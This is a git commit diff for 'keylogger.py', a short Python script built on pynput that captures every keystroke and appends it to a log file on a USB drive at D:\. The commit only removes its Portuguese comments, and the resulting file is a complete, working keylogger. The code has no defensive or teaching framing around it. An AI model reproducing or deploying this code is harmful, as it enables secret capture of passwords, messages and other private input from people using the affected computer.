0b1f5e1b0abaa30670a649e6e6a00ccc55d6bcfb
Cubensis08 <pedrovomsanches@hotmail.com>
2024-10-31 16:01:24 -0300

    keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,23 +1,19 @@
 import os
 from pynput import keyboard
 
-# Caminho para salvar os logs no pendrive
-pendrive_path = 'D:\\keylog.txt'  # Altere para 'D:' se necessário
+pendrive_path = 'D:\\keylog.txt'  
 
-# Verifica se o diretório do pendrive existe
 if not os.path.exists('D:\\'):
     print("Pendrive não encontrado.")
     exit()
 
-# Abre o arquivo para escrita
 with open(pendrive_path, 'a') as f:
     def on_press(key):
         try:
             f.write(f'{key.char}')
         except AttributeError:
             f.write(f' {key} ')
-        f.flush()  # Garante que os dados sejam gravados imediatamente
-
-    # Escuta as teclas
+        f.flush()
+    
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
